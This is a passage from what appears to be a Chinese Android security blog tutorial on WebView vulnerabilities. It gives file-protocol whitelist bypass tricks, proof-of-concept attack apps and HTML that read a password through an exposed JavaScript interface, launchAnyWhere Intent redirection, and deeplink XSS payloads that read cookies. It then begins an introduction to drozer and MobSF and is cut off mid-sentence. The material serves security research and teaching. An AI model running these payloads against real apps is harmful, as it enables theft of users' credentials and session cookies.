alt=\"image-20220730122859092\"></p>\n<p>我们可以发现这里就成功的绕过了白名单进行跳转</p>\n<p><strong>安全防护：</strong></p>\n<p>此时可以在<code>shouldOverrideUrlLoading</code>函数中拦截跳转，并对跳转的Url进行检查</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">shouldOverrideUrlLoading</span><span class=\"params\">(WebView view, WebResourceRequest request)</span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(chechDomain(request.getUrl().toString()))&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>; <span class=\"comment\">//通过检查，允许跳转</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>; <span class=\"comment\">//未通过检查，允许跳转</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>而很多使用<code>shouldOverrideUrlLoading</code>,也是不安全的使用状态，这样还是会存在一些攻击，具体参考：<a href=\"https://blog.oversecured.com/Android-Access-to-app-protected-components/#access-to-arbitrary-components-via-webview\"><strong>Android：访问受应用程序保护的组件</strong></a></p>\n<h4 id=\"（5）file协议绕过\"><a href=\"#（5）file协议绕过\" class=\"headerlink\" title=\"（5）file协议绕过\"></a>（5）file协议绕过</h4><p>APP经常会使用file:&#x2F;&#x2F;协议加载本地文件，通常会限制在一些特定路径中，参考文章：<a href=\"https://mabin004.github.io/2019/04/23/Android-WebView%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/\">Android WebView URL检查绕过</a></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">(<span class=\"number\">1</span>)不要用url.startWith(”file:<span class=\"comment\">//”)来判断是否为file协议，因为“FILE://”(大小)、“File://”(大小写)、“ file://”(前边加空格)、“file:”等方式都可以绕过检测。url.contains(“file://”)更不靠谱，推荐使用getScheme()来判断协议；</span></span><br><span class=\"line\">(<span class=\"number\">2</span>)file:<span class=\"comment\">///android_asset和file:///android_res 也可以../穿越</span></span><br><span class=\"line\">(<span class=\"number\">3</span>)白名单判断了“../，但通过“..\\”也是可以穿越的，例如file:<span class=\"comment\">///sdcard/..\\../sdcard/1.html</span></span><br><span class=\"line\">(<span class=\"number\">4</span>)getHost有漏洞（file:<span class=\"comment\">//a:a@www.qq.com:b@www.baidu.com使用getHost获取到的是qq.com,但实际访问的是baidu.com)</span></span><br><span class=\"line\">(<span class=\"number\">5</span>)file:<span class=\"comment\">//baidu.com/data/data/tmp 前边的baidu.com是可以不被解析的</span></span><br><span class=\"line\">(<span class=\"number\">6</span>)协议头不包括<span class=\"comment\">///，还是仍然能够正常loadUrl，如file:mnt/sdcard/filedomain.html</span></span><br><span class=\"line\">(<span class=\"number\">7</span>)白名单判断了“../”，但通过url编码绕过，例如file:<span class=\"comment\">///data/data/com.app/%2e%2e/%2e%2e/%2e%2e/sdcard/xxx</span></span><br><span class=\"line\">(<span class=\"number\">8</span>)replace(“../“,””)可以使用”….<span class=\"comment\">//“绕过</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-Intent-WebView漏洞\"><a href=\"#4-Intent-WebView漏洞\" class=\"headerlink\" title=\"4.Intent+WebView漏洞\"></a>4.Intent+WebView漏洞</h3><h4 id=\"（1）Intent访问导出组件加载恶意界面和窃取信息\"><a href=\"#（1）Intent访问导出组件加载恶意界面和窃取信息\" class=\"headerlink\" title=\"（1）Intent访问导出组件加载恶意界面和窃取信息\"></a>（1）Intent访问导出组件加载恶意界面和窃取信息</h4><p><strong>漏洞原理：</strong></p>\n<p>主要通过 WebView 对外暴露的接口和Intent访问导出组件可以导致的攻击手段</p>\n<p><strong>漏洞复现：</strong></p>\n<p>我们编写一个样例代码</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">JsIntentActivity</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AppCompatActivity</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onCreate</span><span class=\"params\">(Bundle savedInstanceState)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>.onCreate(savedInstanceState);</span><br><span class=\"line\">        setContentView(R.layout.activity_js_intent);</span><br><span class=\"line\">        <span class=\"type\">WebView</span> <span class=\"variable\">webView</span> <span class=\"operator\">=</span> findViewById(R.id.Wind_webviewIntent);</span><br><span class=\"line\">        webView.getSettings().setJavaScriptEnabled(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        webView.addJavascriptInterface(<span class=\"keyword\">new</span> <span class=\"title class_\">AndroidtoJs</span>(), <span class=\"string\">&quot;test&quot;</span>);</span><br><span class=\"line\">        webView.loadData(<span class=\"string\">&quot;&quot;</span>, <span class=\"string\">&quot;text/html&quot;</span>, <span class=\"literal\">null</span>);</span><br><span class=\"line\">        <span class=\"type\">Uri</span> <span class=\"variable\">getUri</span> <span class=\"operator\">=</span> getIntent().getData();</span><br><span class=\"line\">        webView.loadUrl(String.valueOf(getUri));</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 提供接口在Webview中供JS调用</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">AndroidtoJs</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 定义JS需要调用的方法，被JS调用的方法必须加入@JavascriptInterface注解</span></span><br><span class=\"line\">        <span class=\"meta\">@JavascriptInterface</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> String <span class=\"title function_\">getPassword</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;WindXaa12345678&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里我们可以看出我们获取了密码<code>WindXaa12345678</code>，一般应用程序会对这里进行加密或者混淆，我们这里简单演示就不进行加密了</p>\n<p>我们将该组件设置为导出组件</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/32.png\" alt=\"image-20220729171422196\"></p>\n<p>我们对实例样本分析，这里就可以利用接口导出的漏洞进行攻击</p>\n<p><strong>漏洞复现：</strong></p>\n<p>我们再编写攻击样本：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">MainActivity</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AppCompatActivity</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onCreate</span><span class=\"params\">(Bundle savedInstanceState)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>.onCreate(savedInstanceState);</span><br><span class=\"line\">        setContentView(R.layout.activity_main);</span><br><span class=\"line\">        <span class=\"type\">Button</span> <span class=\"variable\">button</span> <span class=\"operator\">=</span> findViewById(R.id.button);</span><br><span class=\"line\">        button.setOnClickListener(<span class=\"keyword\">new</span> <span class=\"title class_\">View</span>.OnClickListener() &#123;</span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onClick</span><span class=\"params\">(View v)</span> &#123;</span><br><span class=\"line\">                <span class=\"type\">Intent</span> <span class=\"variable\">attackIntent</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>();</span><br><span class=\"line\">                attackIntent.setClassName(<span class=\"string\">&quot;com.iwindxaa.webview&quot;</span>,<span class=\"string\">&quot;com.iwindxaa.webview.JsIntentActivity&quot;</span>);</span><br><span class=\"line\">                attackIntent.setData(Uri.parse(<span class=\"string\">&quot;http://ip地址端口号/attack.html&quot;</span>));</span><br><span class=\"line\">                startActivity(attackIntent);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>然后我们在本地编写恶意的html，利用前面讲述的远程加载</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;meta charset=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span><br><span class=\"line\">    &lt;title&gt;WebView Atack&lt;/title&gt;</span><br><span class=\"line\">    &lt;script&gt;</span><br><span class=\"line\">         function <span class=\"title function_\">callAndroid</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">            <span class=\"comment\">//由于对象映射，所以调用test对象等于调用Android映射的对象</span></span><br><span class=\"line\">            <span class=\"type\">var</span> <span class=\"variable\">password</span> <span class=\"operator\">=</span> test.getPassword();</span><br><span class=\"line\">\t\t\tdocument.getElementById(<span class=\"string\">&quot;getdata&quot;</span>).innerHTML= password;</span><br><span class=\"line\">         &#125;</span><br><span class=\"line\">     &lt;/script&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">   &lt;p id=<span class=\"string\">&quot;getdata&quot;</span>&gt;攻击获得的数据将显示在此……&lt;/p&gt;</span><br><span class=\"line\">   &lt;!--点击按钮则调用callAndroid函数--&gt;</span><br><span class=\"line\">   &lt;button type=<span class=\"string\">&quot;button&quot;</span> id=<span class=\"string\">&quot;button1&quot;</span> onclick=<span class=\"string\">&quot;callAndroid()&quot;</span>&gt;CIntent Attack!&lt;/button&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<p>然后启动http_server</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/33.png\" alt=\"image-20220729172309137\"></p>\n<p>此时我们启动攻击样本，并点击按钮</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/34.png\" alt=\"image-20220729172422110\"></p>\n<p>这里我们可以成功的加载我们的页面说明恶意html注入成功</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/35.png\" alt=\"image-20220729172443186\"></p>\n<p>然后我们再次点击js中的按钮，就可以获取敏感数据</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/36.png\" alt=\"image-20220729172552889\"></p>\n<p>这里就获取的敏感的数据</p>\n<h4 id=\"（2）Intent重定向导致launchAnyWhere漏洞\"><a href=\"#（2）Intent重定向导致launchAnyWhere漏洞\" class=\"headerlink\" title=\"（2）Intent重定向导致launchAnyWhere漏洞\"></a>（2）Intent重定向导致launchAnyWhere漏洞</h4><p><strong>漏洞原理：</strong></p>\n<p>我们都知道Android中的组件需要导出才能够访问，而导出的组件往往存在一定的安全问题。</p>\n<p>导出的组件一般有以下三种形式：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>在AndroidManifest.xml中的组件如果显式设置了组件属性android:exported值为<span class=\"literal\">true</span>;</span><br><span class=\"line\"><span class=\"number\">2.</span>如果组件没有显式设置android:exported为<span class=\"literal\">false</span>，但是其intent-filter以及action存在，则也为导出组件</span><br><span class=\"line\"><span class=\"number\">3.</span>API Level在<span class=\"number\">17</span>以下的所有App的provider组件的android:exported属性默认值为<span class=\"literal\">true</span>，<span class=\"number\">17</span>及以上默认值为<span class=\"literal\">false</span>。</span><br></pre></td></tr></table></figure>\n\n<p>未导出的组件：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">组件显式设置android:exported=<span class=\"string\">&quot;false&quot;</span> </span><br><span class=\"line\">组件没有intent-filter, 且没有显式设置android:exported的属性值，默认为非导出的;</span><br><span class=\"line\">组件虽然配置了intent-filter,，但是显式设置android:exported=<span class=\"string\">&quot;false&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>而通过一定的方法可以访问未导出的组件，我们将这种漏洞成为<code>launchAnyWhere</code>漏洞</p>\n<p>Intent可以通过重定向的原理，通过携带数据信息，访问一个可导出的组件，然后再进行数据传递去触发不可导出的组件，最后实现访问私有组件的目的，引起<code>launchAnyWhere</code>漏洞</p>\n<p><strong>漏洞复现：</strong></p>\n<p>我们查看一个样本案例：</p>\n<p>首先是不可导出组件PrivateActivity:</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/53.png\" alt=\"image-20220730124850689\"></p>\n<p>然后可导出的组件：WebView2Activity</p>\n<p>代码层的校验代码：</p>\n<p><code>WebView2Activity</code></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/54.png\" alt=\"image-20220730125041041\"></p>\n<p><code>PrivateActivity</code></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/55.png\" alt=\"image-20220730125108657\"></p>\n<p>然后我们编写攻击代码：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/56.png\" alt=\"image-20220730125254413\"></p>\n<p>效果如下：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/57.png\" alt=\"image-20220730125323004\"></p>\n<p>可以看出我们通过WebView+Intent重定向就可以访问私有组件，从而实现launchAnyWhere漏洞</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/58.png\" alt=\"image-20220730125359818\"></p>\n<h3 id=\"5-Deeplink-WebView漏洞\"><a href=\"#5-Deeplink-WebView漏洞\" class=\"headerlink\" title=\"5.Deeplink+WebView漏洞\"></a>5.Deeplink+WebView漏洞</h3><p>deeplink 是一种在网页中启动App的超链接。当用户点击deeplink链接时，Android系统会启动注册该deeplink的应用，打开在Manifest文件中注册该deeplink的activity。</p>\n<p>deeplink在APP中会导致多类漏洞：通过deeplink操纵WebView造成的远程代码执行、敏感信息泄露、应用克隆、launchAnyWhere等漏洞。</p>\n<h4 id=\"（1）任意代码执行漏洞\"><a href=\"#（1）任意代码执行漏洞\" class=\"headerlink\" title=\"（1）任意代码执行漏洞\"></a>（1）任意代码执行漏洞</h4><p><strong>漏洞原理：</strong></p>\n<p>样本代码层通过反射调用去安装的列表中搜索安装的应用，然后去调用其方法进行实现，我们可以构造相同的包名，然后将攻击样本去安装到手机上，是的应用触发任意代码执行漏洞</p>\n<p><strong>漏洞复现：</strong></p>\n<p>样本代码段：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/59.png\" alt=\"image-20220730125800892\"></p>\n<p>我们构造Poc：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/60.png\" alt=\"image-20220730125820419\"></p>\n<p>注意这里我们要保证构造的攻击应用的包名和代码中校验的一致才能触发，然后我们启动，可以发现成功的触发了</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/61.png\" alt=\"image-20220730125901727\"></p>\n<p><strong>漏洞防护：</strong></p>\n<p>需要对具体的包名进行校验，并对DeepLink进行过滤</p>\n<h4 id=\"（2）XSS注入漏洞\"><a href=\"#（2）XSS注入漏洞\" class=\"headerlink\" title=\"（2）XSS注入漏洞\"></a>（2）XSS注入漏洞</h4><p><strong>漏洞原理：</strong></p>\n<p>这也是我们结合Deeplink+WebView导致的一个漏洞问题，我们可以通过构造含深度调用链的JS，然后通过加载去实现XSS注入</p>\n<p><strong>漏洞复现：</strong></p>\n<p>首先我们查看样本的DeepLinks</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/62.png\" alt=\"image-20220730130234190\"></p>\n<p>然后我们可以发现样本的代码：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/63.png\" alt=\"image-20220730130256549\"></p>\n<p>我们构造攻击脚本：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/64.png\" alt=\"image-20220730130336427\"></p>\n<p>然后我们通过去访问该html:</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/65.png\" alt=\"image-20220730130416578\"></p>\n<p>接着我们使用目标样本打开：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/66.png\" alt=\"image-20220730130442740\"></p>\n<p>即可以成功的进行XSS注入</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/67.png\" alt=\"image-20220730130506890\"></p>\n<h4 id=\"（3）DeepLinks在WebView上的组合漏洞\"><a href=\"#（3）DeepLinks在WebView上的组合漏洞\" class=\"headerlink\" title=\"（3）DeepLinks在WebView上的组合漏洞\"></a>（3）DeepLinks在WebView上的组合漏洞</h4><p>我们前面分析了很多DeepLinks在WebView上的漏洞，我们还可以将这些漏洞组合使用，我在测试一款银行的样本中发现组合漏洞：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/68.png\" alt=\"image-20220730130714437\"></p>\n<p>这个结合了前面我们讲的网络漏洞、路径穿越、XSS、WebView漏洞，具体的大家可以去听我在平安SRC&amp;&amp;看雪的沙龙会议中的演讲。</p>\n<p>以及我在网上收集的一个大佬的文章，描述的漏洞利用流程，大家可以参考：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/76.png\" alt=\"image-20220730141930818\"></p>\n<p>参考文章：<a href=\"http://blog.nsfocus.net/app-vulnerability-exploitation-combination-boxing/\">APP漏洞利用组合拳——应用克隆案例分析</a></p>\n<h4 id=\"（4）loadDataWithBaseURL漏洞\"><a href=\"#（4）loadDataWithBaseURL漏洞\" class=\"headerlink\" title=\"（4）loadDataWithBaseURL漏洞\"></a>（4）loadDataWithBaseURL漏洞</h4><p>当<code>loadDataWithBaseURL</code>的域名和内容同时可控是，可以构造任意域下的XSS</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">void</span> <span class=\"title function_\">loadDataWithBaseURL</span> </span><br><span class=\"line\"><span class=\"params\">(String baseUrl,</span></span><br><span class=\"line\"><span class=\"params\">String data, </span></span><br><span class=\"line\"><span class=\"params\">String mimeType, </span></span><br><span class=\"line\"><span class=\"params\">String encoding,</span></span><br><span class=\"line\"><span class=\"params\">String historyUrl)</span></span><br></pre></td></tr></table></figure>\n\n<p>除了明显的情况外，攻击者控制调用中的<code>baseUri</code>和参数<code>data</code></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">webView.loadDataWithBaseURL(<span class=\"string\">&quot;https://google.com/&quot;</span>,</span><br><span class=\"line\">           <span class=\"string\">&quot;&lt;script&gt;document.write(document.domain)&lt;/script&gt;&quot;</span>,</span><br><span class=\"line\">           <span class=\"literal\">null</span>, <span class=\"literal\">null</span>, <span class=\"literal\">null</span>);</span><br></pre></td></tr></table></figure>\n\n<p><strong>漏洞原理：</strong></p>\n<p>deeplink加载任意fragment，转化为WebView loadDataWithBaseURL漏洞</p>\n<p><strong>漏洞复现：</strong></p>\n<p>实现步骤：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">(1)victim-app://c/contact/2?fragmen_class=&lt;fragment&gt;可启动任意fragment，并可 通过Intent Extra传参</span><br><span class=\"line\">(2)寻找到⼀个带WebView的Fragment：GoogleMapWebViewFragment</span><br><span class=\"line\">(3)可污染loadDataWithBaseURL的前两个参数，构造victim.com域下的XSS</span><br><span class=\"line\">webview.loadDataWithBaseURL(&quot;victim.com&quot;,&quot;google-map.html&quot;,\t&quot;text/html&quot;,\t...);</span><br></pre></td></tr></table></figure>\n\n<p>攻击代码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Intent</span> <span class=\"variable\">payload</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>(Intent.ACTION_VIEW); </span><br><span class=\"line\">payload.setData(Uri.parse(<span class=\"string\">&quot;victim-app://c/contact/2?fragmen_class=com.victim.app.GoogleWebViewMapFragment&quot;</span>)); </span><br><span class=\"line\"><span class=\"type\">Bundle</span> <span class=\"variable\">extra</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Bundle</span>(); </span><br><span class=\"line\">extra.putString(<span class=\"string\">&quot;map_url&quot;</span>, <span class=\"string\">&quot;\\&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&lt;script&gt;&quot;</span>); </span><br><span class=\"line\">extra.putString(<span class=\"string\">&quot;map_file_name&quot;</span>, <span class=\"string\">&quot;google_map.html&quot;</span>); </span><br><span class=\"line\">extra.putString(<span class=\"string\">&quot;map_domain&quot;</span>, <span class=\"string\">&quot;https://www.victim-app.com&quot;</span>); </span><br><span class=\"line\">payload.putExtra(<span class=\"string\">&quot;bundle&quot;</span>, extra); </span><br><span class=\"line\">startActivity(payload);</span><br></pre></td></tr></table></figure>\n\n<p>可以通过这个deeplink打开任意fragment的漏洞，实现可控任意域执行任意JS，实现盗取登陆态的用户cookie！</p>\n<p>具体参考：<a href=\"https://mp.weixin.qq.com/s/81Lq-JwASnkSS2wg62HSvA\">Android中的特殊攻击面（二）——危险的deeplink</a></p>\n<h2 id=\"五、实验总结\"><a href=\"#五、实验总结\" class=\"headerlink\" title=\"五、实验总结\"></a>五、实验总结</h2><p>本文我编写了很久，主要是一些案例和网上的漏洞复现需要大量的时间去做，很多案例和攻击poc，我都进行了手动编写，一些网上已有的大佬的文章样例，我也进行了一一的复现，将一些不能复现的全部剔除，WebView漏洞是Android APP上当前十分重要的漏洞，漏洞的种类十分多，本文归纳了20多种类别的漏洞并进行了一一的复现，具体漏洞扩展，大家可以参考后面的文献，而实验的poc和攻击样本我也会上传知识星球和github。</p>\n<p>github网址：<a href=\"https://github.com/WindXaa\">WindXaa</a></p>\n<h2 id=\"六、参考文献\"><a href=\"#六、参考文献\" class=\"headerlink\" title=\"六、参考文献\"></a>六、参考文献</h2><p>会议：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">2020 看雪SDC  Android WebView安全攻防指南2020</span><br></pre></td></tr></table></figure>\n\n<p>WebView的原理：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://ljd1996.github.io/2020/12/01/Android-WebView%E7%AC%94%E8%AE%B0/</span><br><span class=\"line\">https://blog.csdn.net/carson_ho/article/details/64904691</span><br><span class=\"line\">https://juejin.cn/post/6844903564737789965#heading-9</span><br><span class=\"line\">https://www.cnblogs.com/linhaostudy/p/14617314.html</span><br><span class=\"line\">https://mabin004.github.io/2018/06/11/Android-JsBridge/</span><br></pre></td></tr></table></figure>\n\n<p>远程代码执行漏洞：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cloud.tencent.com/developer/article/1394368</span><br><span class=\"line\">https://blog.csdn.net/weixin_39190897/article/details/125107626</span><br></pre></td></tr></table></figure>\n\n<p>WebView跨域漏洞：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://blogs.360.cn/post/webview%E8%B7%A8%E6%BA%90%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90.html</span><br><span class=\"line\">https://blog.csdn.net/qq_35993502/article/details/121371049</span><br><span class=\"line\">https://bbs.pediy.com/thread-269849.htm</span><br><span class=\"line\">https://forum.butian.net/share/1562</span><br></pre></td></tr></table></figure>\n\n<p>URL配置漏洞：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://www.freebuf.com/articles/terminal/201407.html</span><br><span class=\"line\">https://mabin004.github.io/2019/04/23/Android-WebView%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/</span><br><span class=\"line\">https://www.freebuf.com/articles/web/208868.html</span><br></pre></td></tr></table></figure>\n\n<p>Intent Scheme绕过：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://drops.xmd5.com/static/drops/papers-2893.html</span><br><span class=\"line\">https://blog.csdn.net/l173864930/article/details/36951805</span><br></pre></td></tr></table></figure>\n\n<p>Intent:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://blogs.360.cn/post/launchanywhere-google-bug-7699048.html</span><br><span class=\"line\">http://drops.xmd5.com/static/drops/papers-2893.html</span><br></pre></td></tr></table></figure>\n\n<p>deeplink:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://mp.weixin.qq.com/s/81Lq-JwASnkSS2wg62HSvA?</span><br><span class=\"line\">http://blog.nsfocus.net/app-vulnerability-exploitation-combination-boxing/</span><br></pre></td></tr></table></figure>\n\n","categories":["Android APP漏洞之战"],"tags":["漏洞挖掘","工具"]},{"title":"Android App漏洞之战（1）——drozer+Inspeckage(xposed)+MobSF","url":"/2022/12/15/bug1/","content":"<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>最近在学习Android APP客户端漏洞挖掘过程中，对Android APP端漏洞挖掘做了一个基本的梳理总结本节主要是在介绍Android APP漏洞挖掘过程中，使用常见的Android漏洞挖掘工具的安装和使用办法，帮助Android漏洞挖掘人员提供便利。本文里面一部分的介绍采摘与网络博客，大家可以点击对应的网址进行查看。</p>\n<span id=\"more\"></span>\n<p>为什么选择drozer+Inspeckage+Mobsf三个工具呢，这是因为在我进行Android APP漏洞挖掘的过程中，这三个工具很好的提供了自动化的分析和一些对应的hook技术，极大的方便了Android APP漏洞挖掘工作。下面将依次介绍每一种工具的安装和使用，后续继续会用一些案例来实际操作。</p>\n<h2 id=\"二、Android-APP漏洞介绍\"><a href=\"#二、Android-APP漏洞介绍\" class=\"headerlink\" title=\"二、Android  APP漏洞介绍\"></a>二、Android  APP漏洞介绍</h2><p>根据中国互联网协会APP数据安全测评服务工作组在2020年发布的《移动应用安全形势研究报告》中显示，2020 年度收录存在安全漏洞威胁的 APK 860 万余个，同 一 App 普遍存在多个漏洞。其中存在的 Janus 漏洞风险 App 数量最多，占监测总量的 78.13%；其次是 Java 代码加壳检 测，占总量的 62.45%；排在第三位的是动态注册 Receiver 风险，占总量的 61.16%。</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/1.png\" alt=\"image-20210902161658499\"></p>\n<p>根据爱加密的Android客户端常见漏洞调研显示，Android方向的漏洞总共可以分为三个方面：组件安全、业务安全、数据安全。</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/2.png\" alt=\"image-20210902161947967\"></p>\n<p>我们可以看出针对不同的安全问题，我们在进行Android APP漏洞挖掘的过程中，也应该有针对性的进行漏洞挖掘。我们更加具体的组件分类，可以大致查看一些Android APP常见安全漏洞：<a href=\"https://ayesawyer.github.io/2019/08/21/Android-App%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/\">https://ayesawyer.github.io/2019/08/21/Android-App%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/</a></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/3.png\" alt=\"image-20210902161947967\"></p>\n<p>根据Android 安全分析平台的Android APP审计系统显示，这也为我们进行Android APP客户端的漏洞挖掘提供了详细的方案：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/4.jpg\" alt=\"image-20210902161947967\"></p>\n<p>综上，我们对Android APP漏洞挖掘和Android安全测试就有了一个初步的认识，接下来我们来看这三个神器具体是怎么安装和使用，帮助我们移动安全分析人员提供便利。</p>\n<h2 id=\"三、工具的安装和使用\"><a href=\"#三、工具的安装和使用\" class=\"headerlink\" title=\"三、工具的安装和使用\"></a>三、工具的安装和使用</h2><h3 id=\"1-drozer\"><a href=\"#1-drozer\" class=\"headerlink\" title=\"1.drozer\"></a>1.drozer</h3><h4 id=\"（1）drozer介绍\"><a href=\"#（1）drozer介绍\" class=\"headerlink\" title=\"（1）drozer介绍\"></a>（1）drozer介绍</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">drozer是一款针对Android系统的安全测试框架，可以分成两个部分：其一是“console”，它运行在本地计算机上；其二是“server”，它是一个安装在目标Android设备上的app，当使用console与Android设备交互时，就是把Java代码输入到运行在实际设备上的drozer代理(agent)中。</span><br><span class=\"line\">根据drozer官方的描述，drozer主要是有助于Android研究人员去测试一些共享的Android漏洞，对于远程攻击，可以生成shellcode来帮助开发人员将drozer Agent 部署为远程管理员工具，从而最大程度利用设备。</span><br><span 